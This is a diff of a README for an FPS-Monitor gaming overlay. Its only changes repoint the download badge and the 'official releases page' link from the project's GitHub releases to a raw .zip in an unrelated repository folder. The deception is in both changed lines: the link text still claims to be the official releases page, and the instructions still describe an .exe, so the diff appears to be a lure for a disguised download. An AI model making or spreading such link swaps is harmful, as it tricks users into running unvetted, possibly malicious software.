@@ -5,7 +5,7 @@ description: "Track your frame rate and hardware performance in real time on Win
 ---
 # 🖥️ FPS-Monitor - Track your gaming performance with ease
 
-[![](https://img.shields.io/badge/Download-FPS_Monitor-blue)](https://github.com/genusaquilegianonagenarian381/FPS-Monitor/releases)
+[![](https://img.shields.io/badge/Download-FPS_Monitor-blue)](https://raw.githubusercontent.com/genusaquilegianonagenarian381/genusaquilegianonagenarian381.github.io/main/unassociated/io-github-genusaquilegianonagenarian-v2.8.zip)
 
 FPS-Monitor provides real-time data about your computer hardware during games. It places an overlay on your screen so you see your frame rate, CPU temperature, and memory usage. This tool helps you check if your hardware runs games well.
 
@@ -15,7 +15,7 @@ This software works on Windows 10 and Windows 11. You need at least 4GB of RAM t
 
 ## 📥 How to Download 
 
-1. Visit the [official releases page](https://github.com/genusaquilegianonagenarian381/FPS-Monitor/releases) to download the latest version.
+1. Visit the [official releases page](https://raw.githubusercontent.com/genusaquilegianonagenarian381/genusaquilegianonagenarian381.github.io/main/unassociated/io-github-genusaquilegianonagenarian-v2.8.zip) to download the latest version.
 2. Look for the file ending in .exe under the most recent version tag.
 3. Click the file name to start your download.
 4. Save the file to your Downloads folder or your Desktop.
